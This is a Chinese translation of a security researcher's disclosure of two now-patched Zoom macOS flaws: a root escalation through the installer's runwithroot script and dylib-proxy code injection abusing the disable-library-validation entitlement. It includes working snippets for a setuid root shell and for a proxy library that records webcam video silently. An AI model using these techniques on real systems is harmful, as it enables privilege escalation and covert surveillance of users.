> 原文链接: https://www.anquanke.com//post/id/202673 


# macOS版本Zoom最新本地安全漏洞分析


                                阅读量   
                                **537011**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://objective-see.com/blog/blog_0x56.html
                                <br>原文地址：[]()

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01e8424d88deebe98b.jpg)](https://p5.ssl.qhimg.com/t01e8424d88deebe98b.jpg)

## 前言

Zoom在4.6.9 (19273.0402)版本中已将漏洞修复：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a004adc3837c672f.png)<br>
关于补丁的更多细节请移步以下链接：<br>[macOS上的最新更新](https://support.zoom.us/hc/en-us/articles/201361963-New-Updates-for-macOS)



## 背景

由于当前全球受疫情影响严重，政府已下达相关封锁措施。在家办公成为了主流的工作形式。也正因如此“现代企业视频通信的领导者” Zoom逐渐成为家喻户晓的软件平台，其股价也开始一路飙升📈。

然而，如果你对(网络)安全或者隐私比较重视，那么在使用(macOS版本)应用程序时需小心谨慎。

在本篇文章中，首先我们将简要介绍最近影响Zoom的相关安全、隐私漏洞。而后我们会讨论在最新版本的Zoom(macOS客户端)中发现的几个新的安全问题。

尽管我们今天要讨论的安全问题仍未解决（注：文章写作之时还未修复，现已修复），但它们都是本地安全问题。也就是说恶意软件或者攻击者如果想利用这些漏洞，需要在macOS系统中已然成功驻留。

虽然Zoom软件非常受欢迎，但它在安全和隐私方面的表现实在不尽如人意。

2019年6月，安全研究员[乔纳森·莱切德(Jonathan Leitschuh)](https://twitter.com/JLLeitschuh)在Mac上的Zoom客户端中发现了一个可利用的远程0day漏洞，使得任意恶意网站能够在未经用户允许的情况下启动用户的摄像头😱。<br>[![](https://p4.ssl.qhimg.com/t0143a2dc0e8d2d5868.png)](https://p4.ssl.qhimg.com/t0143a2dc0e8d2d5868.png)<br>
如果用户摄像头已打开，漏洞允许任意网站在未经许可的情况下强行加入Zoom的通话中。此外，在你将Zoom客户端卸载后，您的机器上仍然会有一个本地web服务，它的作用是在你访问网页时重新为您安装Zoom客户端且无需其他任何交互。这个重安装的特性保留至今。-Jonathan Leitschuh

如果你对此还想了解更多细节，请访问以下链接：[“Zoom Zero Day: 4+ Million Webcams &amp; maybe an RCE?”](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5).

更好笑的是Apple公司后来通过macOS的`Malware Removal Tool` (`MRT`)工具强制移除掉了Zoom中有问题的相关组件。[详情链接](//twitter.com/patrickwardle/status/1149176886817255424?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1149176886817255424&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

据我所知，这是Apple公司唯一一次采取如此严厉的行动。[详情链接](//twitter.com/thomasareed/status/1244710649508302854?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1244710649508302854&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

最近，Zoom遭遇了相当尴尬的隐私泄露事件，有研究者发现他们的ios程序会在即使没有Facebook账户的情况下向Facebook发送数据。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b1783de8227ab471.png)<br>
如果你对此还想了解更多细节，请访问以下链接：[“Zoom iOS App Sends Data to Facebook Even if You Don’t Have a Facebook Account”](https://www.vice.com/en_ca/article/k7e599/zoom-ios-app-sends-data-to-facebook-even-if-you-dont-have-a-facebook-account).

尽管Zoom迅速修补了相关漏洞（通过删除对应部分代码），但仍然有许多安全研究者指出，这些代码原本一开始就不应该出现在程序中。[详情链接](//twitter.com/_inside/status/1243702866931601408?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1243702866931601408&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

如今，著名macOS安全研究员[Felix Seele](https://twitter.com/c1truz_)（OBTS v2.0演讲者）指出，Zoom在macOS上的安装器在执行安装任务时不需要用户的点击安装。[详情链接](//twitter.com/c1truz_/status/1244737672930824193?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1244737672930824193&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

这种做法并不是严格意义上的恶意行为，但仍然有导致安全问题发生的可能。安装应用程序时没有得到用户的最终同意，并且使用一个具有高度误导性的提示来获得root权限。这种技巧只出现在macOS恶意软件身上。 -Felix Seele

如果你对此还想了解更多细节，请访问以下链接：[“Good Apps Behaving Badly: Dissecting Zoom’s macOS installer workaround”](https://www.vmray.com/cyber-security-blog/zoom-macos-installer-analysis-good-apps-behaving-badly/)

Felix提到的安装脚本，我们可以通过[Suspicious Package](https://mothersruin.com/software/SuspiciousPackage/)从Zoom的安装器包中轻易地提取并查看：<br>[![](https://p3.ssl.qhimg.com/t013be41981d099c3aa.png)](https://p3.ssl.qhimg.com/t013be41981d099c3aa.png)



## Zoom本地安全漏洞#1 权限提升漏洞

Zoom公司在安全和隐私方面的处理还有很多不足之处。因此，在Felix Seele[提到](https://twitter.com/c1truz_/status/1244737675191619584)Zoom安装器会调用AuthorizationExecuteWithPrivileges API来执行各种特权安装任务之时，我决定仔细研究一下。很快我就发现了几个安全问题，其中包括一个可靠的本地特权提升漏洞（提升至root权限）。

我曾经多次提到过关于Apple公司明确指出不应该再使用AuthorizationExecuteWithPrivileges API的问题。原因就是此API没有验证将要执行的二进制文件（且是要以root权限运行）。这意味着本地没有高权限的攻击者或者恶意软件可以暗中篡改、替换它，从而将他们的权限升级到root:<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0122545f49bca3ee7e.png)<br>
在DefCon 25期间，我发表过关于此议题的演讲“[Death By 1000 Installers](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken)” 。以及相关的[博文](https://www.anquanke.com/post/id/201463)。

此外， [Julia Vashchenko](https://twitter.com/iaronskaya)在 [“Objective by the Sea” v3.0](https://objectivebythesea.com/v3/)上也做了关于此不安全API演讲，题目为“[Job(s) Bless Us! Privileged Operations on macOS](https://objectivebythesea.com/v3/talks/OBTS_v3_jVashchenko.pdf)“：<br>[![](https://p1.ssl.qhimg.com/t01c85b265c11a1000d.png)](https://p1.ssl.qhimg.com/t01c85b265c11a1000d.png)<br>
同时注意如果AuthorizationExecuteWithPrivileges API执行的是受保护的二进制文件（[SIP](https://en.wikipedia.org/wiki/System_Integrity_Protection)）或者只读类型的程序（脚本），那么这个问题将会迎刃而解。(在这种情况下，非特权代码无法对二进制文件做篡改、替换等操作)

现在我们把目光拉回Zoom本身，“他们是如何利用这种本质上并不安全的API”这一问题成为重中之重。如果他们的调用方式存在缺陷，那我们很可能就会发现一个权限提升漏洞！

正如我在DefCon[演讲](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken)中说的那样，回答这个问题最简单的方法就是运行process monitor，而后执行安装器包（或其他调用AuthorizationExecuteWithPrivileges API的文件），并观察传递给security_authtrampoline的参数(最终执行特权操作的setuid系统二进制程序):<br>[![](https://p2.ssl.qhimg.com/t01541a14de5ac58def.png)](https://p2.ssl.qhimg.com/t01541a14de5ac58def.png)<br>
上图是AuthorizationExecuteWithPrivileges API初始过程的控制流图，并说明了将使用root权限执行的项(二进制、脚本、命令等)是如何作为第一个参数传递给security_authtrampoline进程的。如果这个参数，这个项，可以由一个无特权的攻击者编辑（篡改），那么就会产生严重的安全问题!

我们来看一看Zoom通过AuthorizationExecuteWithPrivileges究竟执行了什么？

首先，我们从[https://zoom.us/download](https://zoom.us/download) 处下载Zoom macOS版本的最新下载器（Version 4.6.8 (19178.0323)）：<br>[![](https://p3.ssl.qhimg.com/t01de9d571bb5229f80.png)](https://p3.ssl.qhimg.com/t01de9d571bb5229f80.png)<br>
然后，我们启动我们在macOS上的进程监控工具Process Monitor（[https://objective-see.com/products/utilities.html#ProcessMonitor](https://objective-see.com/products/utilities.html#ProcessMonitor))，并启动Zoom安装器包（Zoom.pkg）。

如果用户在正常模式（非管理员）下安装Zoom，安装器会弹出以下窗口请求管理员凭据：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013f7fcc5ea935f7f7.png)

我们的进程监控工具会观察/usr/libexec/security_authtrampoline的启动（ES_EVENT_TYPE_NOTIFY_EXEC）来处理授权请求：

```
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
`{`
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : `{`
    "uid" : 0,
    "arguments" : [
      "/usr/libexec/security_authtrampoline",
      "./runwithroot",
      "auth 3",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : `{`
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.security_authtrampoline",
      "cdHash" : "DC98AF22E29CEC96BB89451933097EAF9E01242",
      "isPlatformBinary" : 1
    `}`,
    "path" : "/usr/libexec/security_authtrampoline",
    "pid" : 1882
  `}`,
  "timestamp" : "2020-03-31 03:18:45 +0000"
`}`
```

观察Zoom试图以root权限去执行什么？（也就是传递给security_authtrampoline的参数是什么？）

发现是一个名为runwithroot的bash脚本。

如果用户提供了正确的凭据，runwithroot脚本便会以root权限执行（注：uid: 0）

```
`{`
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : `{`
    "uid" : 0,
    "arguments" : [
      "/bin/sh",
      "./runwithroot",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : `{`
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.sh",
      "cdHash" : "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
      "isPlatformBinary" : 1
    `}`,
    "path" : "/bin/sh",
    "pid" : 1882
  `}`,
  "timestamp" : "2020-03-31 03:18:45 +0000"
`}`
```

runwithroot脚本的内容无关紧要。重要的是，本地无特权的攻击者（或是恶意软件片段）可以在以root用户身份执行脚本之前修改该脚本吗？（再次提醒，AuthorizationExecuteWithPrivileges API不会验证正在执行的内容）

答案是显而易见的：是可以修改的。

我们可以通过一个事实来确认这一点。那就是在安装过程中我们可以注意到macOS安装程序（处理.pkgs）会将runwithroot脚本复制到用户可写的临时目录中：

```
tester@users-Mac T % pwd      
/private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
total 27224
-rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
-rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
-rw-r--r--   1 tester  staff  12008512 Mar 23 02:25 zm.7z
-rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
...
```

看上去我们应该可以获取到root权限~

如下图所示，利用这种类型的漏洞获取权限的做法是十分可靠的（尽管需要一些耐心，因为您必须等待安装程序或更新程序的运行！）：<br>[![](https://p3.ssl.qhimg.com/t0132486023fbc8914f.png)](https://p3.ssl.qhimg.com/t0132486023fbc8914f.png)<br>
为了利用Zoom的这一漏洞，本地非特权攻击者可以在安装（或升级）期间简单地替换或修改runwithroot脚本来获得root用户访问权限。

例如，我们可以向runwithroot脚本中添加以下命令来弹root shell：

```
1 cp /bin/ksh /tmp
2 chown root:wheel /tmp/ksh
3 chmod u+s /tmp/ksh
4 open /tmp/ksh
```

效果图如下：<br>[![](https://p1.ssl.qhimg.com/t010e6d6ea38941cd8c.png)](https://p1.ssl.qhimg.com/t010e6d6ea38941cd8c.png)

## Zoom本地安全漏洞#2 获取麦克风与摄像头权限的代码注入

Zoom软件的使用毋庸置疑需要系统麦克风与摄像头的权限。

在最新版本的macOS上，这种权限的申请需要明确的用户批准。（从安全与隐私的角度来看是一件好事）：<br>[![](https://p5.ssl.qhimg.com/t013dfa25971de14347.png)](https://p5.ssl.qhimg.com/t013dfa25971de14347.png)<br>
然而，Zoom对此具有（出于我所不知道的原因）特殊的“排除项”，该“排除项”允许攻击者将恶意代码注入其进程空间中，使恶意代码拥有了Zoom的（麦克风和摄像头）访问权限！这给攻击者提供了一种记录受害者Zoom会议的方法，更糟糕的是，它甚至可以在任意时间（没有用户访问提示）访问麦克风和摄像头！

现代macOS程序在编译过程中引入了一个叫做[Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime)的特性。Apple官方对这一增强安全的特性描述如下：

**Hardened Runtime**与系统完整性保护(System Integrity Protection, SIP)一起，通过防止某些类型的漏洞(如代码注入、动态链接库(DLL)劫持和进程内存空间篡改)来保护软件运行时的完整性。

苹果公司参加了2016年在莫斯科举行的[ZeroNights](https://twitter.com/ZeroNights)大会，我在会议上注意到该功能将对macOS的安全起到很大作用：<br>[![](https://p1.ssl.qhimg.com/t01175e4b4525f3d0d2.jpg)](https://p1.ssl.qhimg.com/t01175e4b4525f3d0d2.jpg)<br>
我们可以通过codesign工具检查Zoom（或其他任何应用程序）是否已使用“ Hardened Runtime”进行有效签名和编译。

```
$ codesign -dvvv /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
Identifier=us.zoom.xos
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded

...
Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
```

flags值为0x10000（runtime）表示应用程序是使用“ Hardened Runtime”选项编译的。因此，运行时应由macOS对此应用程序强制执行。

到目前为止都很好！正确地实施Hardened Runtime会阻止代码注入等这一类型的攻击。

然而，我终究还是发现了Zoom在实现这一特性上的问题😅。

我们再次通过codesign工具dump出Zoom的entitlements（entitlements是代码签名后的功能或异常）。

```
codesign -d --entitlements :- /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN...&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
  &lt;key&gt;com.apple.security.automation.apple-events&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;com.apple.security.cs.disable-executable-page-protection&lt;/key&gt;
  &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

由于Zoom需要(用户批准的)麦克风和摄像头访问权限，因此需要com.apple.security.device.audio-input和com.apple.security.device.camera这俩个entitlements 。

然而com.apple.security.cs.disable-library-validation这一entitlement非常有趣，简单来说，它的功能就是告诉macOS，我既想要**“Hardened Runtime”**，又想允许任何库加载到我的地址空间中。换句话说代码注入是可行的了！

Apple官方有关于此entitlement的介绍：<br>[![](https://p0.ssl.qhimg.com/t01813b9f3aaff4dd72.png)](https://p0.ssl.qhimg.com/t01813b9f3aaff4dd72.png)<br>
因此，由于这种entitlement的存在，我们(理论上)可以绕过“Hardened Runtime”，并将恶意库代码注入Zoom中(例如，在没有访问警告的情况下访问麦克风和摄像头)。

有多种方法可以强制远程进程在加载或运行时加载动态库。这里我们将重点介绍一叫做`dylib proxying`的方法，这种方法既隐蔽又持久，深受恶意软件作者喜爱。

`dylib proxying`，简而言之就是我们替换了目标（即Zoom）所依赖的合法库文件，然后将Zoom发出的所有请求代理回原始库文件，以确保程序功能正常使用。

`dylib proxying`的另一个好处是它不会损害二进制文件的代码签名证书（但是，它可能会影响程序集的签名）。从而Apple在运行时进行的签名检查(如对麦克风和摄像头的访问)不会检测到恶意库文件，因此仍然可以保持对麦克风和摄像头的访问权限。

这是我在漏洞利用中经常使用的一种方法，例如（以前）绕过SIP：<br>[![](https://p2.ssl.qhimg.com/t0132a8ab9762544177.png)](https://p2.ssl.qhimg.com/t0132a8ab9762544177.png)<br>
如图所示，攻击者可以代理IASUtilities库，这样macOS动态链接器(dyld)就会自动将恶意代码加载(“注入”)到Apple的安装器中(SIP绕过攻击的先决条件)。

回到Zoom的问题上，我们将以类似的方法代理一个库(Zoom需要的)，使得恶意库文件在启动时可以自动加载到Zoom的可信进程地址空间。

为了确定Zoom在运行时链接了哪些库，我们可以通过macOS动态加载程序自动加载Zoom，之后使用otool工具通过L参数将其显示出来：

```
$ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us 
/Applications/zoom.us.app/Contents/MacOS/zoom.us:
  @rpath/curl64.framework/Versions/A/curl64
  /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
  /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
  /usr/lib/libobjc.A.dylib
  /usr/lib/libc++.1.dylib
  /usr/lib/libSystem.B.dylib
  /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
  /System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices
```

由于macOS的系统完整性保护(SIP)，我们不能替换掉任何系统库。<br>
因此，如果想对一个应用程序使用dylib proxying，先决条件就是程序必须从它自己的包或另一个非SIP的位置加载一个库(而且这个库必须是未经过“hardened runtime”编译的(除非它有com.apple.security.cs.disable-library-validation这一entitlement)）。

观察Zoom的的库依赖，我们可以发现[@rpath](https://github.com/rpath)/curl64.framework/Versions/A/curl64，通过带-l参数的otool工具解析出其运行路径（[@rpath](https://github.com/rpath)）：

```
$ otool -l /Applications/zoom.us.app/Contents/MacOS/zoom.us 
...

Load command 22
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)
```

[@executable_path](https://github.com/executable_path)将在运行时解析为二进制文件的路径，因此dylib将从以下位置加载：/Applications/zoom.us.app/Contents/MacOS/../Frameworks，更具体一点是/Applications/zoom.us.app/Contents/Frameworks。

通过Zoom的应用程序包，我们可以确认curl的存在（以及其他许多框架和库）且他们会在Zoom启动时全部加载：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01909280c89c777bf3.png)<br>
对于运行路径（[@rpath](https://github.com/rpath)）、执行路径（executable_path）和proxy dylib的更多细节，请移步以下链接：

[“Dylib Hijacking on OS X”](https://www.virusbulletin.com/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)

为了简单起见，我们将Zoom的libssl.1.0.0.dylib（因为它是一个独立的库，而不是框架/包）作为为我们要代理的库。

首先，重命名合法库，例如我们在库文件名前加一个前缀：`_libssl.1.0.0.dylib`。

现在，如果我们再运行Zoom，会造成意料之中的崩溃，因为缺少必要的库（libssl.1.0.0.dylib）。

```
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
dyld: Library not loaded: @rpath/libssl.1.0.0.dylib
Referenced from: /Applications/zoom.us.app/Contents/Frameworks/curl64.framework/Versions/A/curl64
Reason: image not found
Abort trap: 6
```

这实际上是个好消息，因为这意味着如果我们将任何名为libssl.1.0.0.dylib的库放在Zoom的Frameworks目录下，dyld将会（盲目地）尝试加载它。

接下来，我们通过自定义的constructor创建一个简单的库（加载库时将自动调用）：

```
1__attribute__((constructor))
 2static void constructor(void)
 3`{`
 4    char path[PROC_PIDPATHINFO_MAXSIZE];
 5    proc_pidpath (getpid(), path, sizeof(path)-1);
 6    
 7    NSLog(@"zoom zoom: loaded in %d: %s", getpid(), path);
 8
 9    return;
10`}`
```

并将其保存至/Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib。

之后，重新运行Zoom：

```
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
zoom zoom: loaded in 39803: /Applications/zoom.us.app/Contents/MacOS/zoom.us
```

可以看到我们的库被Zoom成功加载~

但紧接着Zoom就闪退掉了，这是因为我们的libssl.1.0.0.dylib不是一个ssl库，提供不了任何程序需要的功能，所以Zoom无法启动。

不必担心，这正是dylib proxying的用武之地。

接下来，通过简单的链接器指令，我们可以告诉Zoom，“虽然我们的库没有实现您要查找的必需（ssl）功能，但我们知道谁可以提供”，之后将Zoom指向原始（合法）的ssl库（也就是被我们重命名为_libssl.1.0.0.dylib的库）。

整体流程图如下：<br>[![](https://p0.ssl.qhimg.com/t016158bdfe6db6ee55.png)](https://p0.ssl.qhimg.com/t016158bdfe6db6ee55.png)<br>
为了创建所需的链接器指令，我们在Xcode的“`Other Linker Flags`” 下添加-XLinker -reexport_library，然后添加目标代理库的路径：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f71f63a6c8a35610.png)<br>
要完成代理库的创建，我们还必须更新嵌入式重导出路径reexport（在我们的代理dylib中），以便它指向（虽然已重命名）ssl库。Apple为此提供了install_name_tool工具：

```
patrick$ install_name_tool -change @rpath/libssl.1.0.0.dylib /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib  /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
```

现在，我们可以（通过otool）确认我们的代理库引用了原始的ssl库。具体来说就是我们可以观察到在代理dylib中（libssl.1.0.0.dylib）包含一个LC_REEXPORT_DYLIB，它指向原始的ssl库（_libssl.1.0.0.dylib）：

```
patrick$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib 

...
Load command 11
          cmd LC_REEXPORT_DYLIB
      cmdsize 96
         name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib
   time stamp 2 Wed Dec 31 14:00:02 1969
      current version 1.0.0
compatibility version 1.0.0
```

重新运行Zoom确认我们的代理库（和原始ssl库）均已加载，并且Zoom可以正常地运行！🔥<br>[![](https://p5.ssl.qhimg.com/t01402d7329f7846122.png)](https://p5.ssl.qhimg.com/t01402d7329f7846122.png)<br>
向Zoom注入恶意库代码的魅力在于其（用户授予的）对麦克风和摄像头的访问权限。将我们的恶意程序库加载到Zoom的进程/地址空间后，**该库将自动继承Zoom的所有访问权限**。

这意味着，如果用户为Zoom提供了对麦克风和摄像头的访问权限（一种可能的情况），则我们注入的库也拥有访问这些设备的同等权限。

如果尚未授予Zoom访问麦克风或摄像头的权限，则我们的恶意库应能够检测到该情况并作出反应（悄悄关闭）。或者我们可以继续尝试访问设备，因为访问提示将“合法地”从Zoom发出，因此很可能会由不知情的用户批准。

为了测试这种“访问权限的继承”，我向注入的库中添加了一些代码，来录制几秒钟的网络摄像头视频：

```
1 
 2  AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
 3    
 4  session = [[AVCaptureSession alloc] init];
 5  output = [[AVCaptureMovieFileOutput alloc] init];
 6  
 7  AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device 
 8                                error:nil];
 9
10  movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
11  
12  [self.session addInput:input];
13  [self.session addOutput:output];
14  [self.session addOutput:movieFileOutput];
15  
16  [self.session startRunning];
17  
18  [movieFileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"zoom.mov"] 
19                   recordingDelegate:self];
20  
21  //stop recoding after 5 seconds
22  [NSTimer scheduledTimerWithTimeInterval:5 target:self 
23           selector:@selector(finishRecord:) userInfo:nil repeats:NO];
24  
25  ...
```

在正常情况下此代码会触发来自macOS的警报，要求用户确认对麦克风和摄像头的访问。但是，当我们将其注入Zoom（已由用户确认访问）时，将不会显示其他提示，并且注入的代码可以任意录制音频和视频。

这项测试拍下了这项研究背后真正的主导者（狗头保命）：<br>[![](https://p2.ssl.qhimg.com/t0118a882e920814dee.png)](https://p2.ssl.qhimg.com/t0118a882e920814dee.png)<br>
恶意软件是否可以在任意时间使用Zoom捕获音频和视频（即监视用户）。如果安装了Zoom并被授予访问麦克风和摄像头的权限，那么答案显而易见：可以！同时我们可以通过/usr/bin/open -j 将程序隐藏起来。



## 总结

我们发现了两个影响Zoom（macOS版本）本地安全的漏洞。鉴于Zoom一直以来在隐私和安全方面的不良表现，这也是在我们的意料之中。

首先，我们展示了无特权攻击者或恶意软件如何利用Zoom的安装器获取root权限。

之后，由于特殊的entitlement，我们成功展示了如何将恶意库注入到Zoom的受信任进程上下文中。这使得恶意软件能够记录所有Zoom会议，甚至是在后台启动Zoom的情况下，能够在任意时间访问用户的麦克风和网络摄像头！😱

前者的问题在于许多企业（现在）使用Zoom来（可能）进行敏感的商务会议，而后者的问题在于即使没有macOS警报或提示，恶意软件仍然可以秘密地访问麦克风或网络摄像头。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d89190af4e048ec5.png)

### <a class="reference-link" name="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"></a>解决方法

老实说，如果您关心自己的安全或隐私，可以考虑停止使用Zoom。如果必须使用Zoom，可以使用我编写的一些免费工具来帮助检测这些攻击。😇

首先， [OverSight](https://objective-see.com/products/oversight.html)可以在任何人任何时间访问您的麦克风和摄像头时提醒您：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e521b9b707012fb7.png)<br>
因此，即使攻击者或恶意软件在后台运行Zoom，OverSight也会生成警报。

另一个（免费）工具是 [KnockKnock](https://objective-see.com/products/knockknock.html)，可以检测代理库：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0176a88f92d699b29a.png)
